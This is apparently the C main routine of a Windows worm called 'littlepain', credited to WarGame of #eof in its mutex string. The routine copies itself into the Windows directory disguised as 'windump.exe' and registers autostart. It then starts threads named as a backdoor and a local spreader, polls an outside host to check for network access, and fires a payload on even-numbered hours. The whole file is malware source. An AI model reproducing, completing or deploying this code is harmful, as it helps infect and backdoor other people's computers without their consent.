#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string.h>

#pragma optimize("", off)
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    volatile struct _LocalCtx {
        char my_path[MAX_PATH];
        char new_path[MAX_PATH];
        DWORD ThreadID;
        WSADATA wsa;
        SYSTEMTIME time;
    } ctx;

    CreateMutexA(NULL, FALSE, "__[__ littlepain by [WarGame,#eof] __]__");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        ExitProcess(0);
    }

    GetModuleFileNameA(NULL, ctx.my_path, MAX_PATH);
    GetWindowsDirectoryA(ctx.new_path, MAX_PATH);
    strcat(ctx.new_path, "\\windump.exe");
    CopyFileA(ctx.my_path, ctx.new_path, FALSE);
    _AutoStart((BYTE*)ctx.new_path);

    if (WSAStartup(MAKEWORD(1,1), &ctx.wsa) != 0)
    {
        return 0;
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_L0cal_4, ctx.new_path, 0, &ctx.ThreadID);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_BackDoor_4, NULL, 0, &ctx.ThreadID);

    while (!gethostbyname("www.freetibet.org"))
    {
        Sleep(1000*60*20);
    }

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extra, ctx.new_path, 0, &ctx.ThreadID);

    GetSystemTime(&ctx.time);
    if (ctx.time.wHour % 2 == 0)
    {
        _Payload();
    }

    Sleep(INFINITE);
    return 0;
}
#pragma optimize("", on)
